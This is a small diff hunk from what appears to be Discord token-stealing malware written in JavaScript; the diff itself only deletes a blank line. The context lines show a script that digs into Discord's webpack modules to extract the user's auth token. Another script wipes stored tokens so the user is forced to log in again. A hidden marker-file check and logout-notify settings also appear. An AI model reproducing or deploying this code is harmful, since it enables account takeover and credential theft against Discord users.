@@ -10,7 +10,6 @@ var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in 
 var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();`
 var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false
 
-
 var config = {
     "logout": "true",
     "logout-notify": "true",
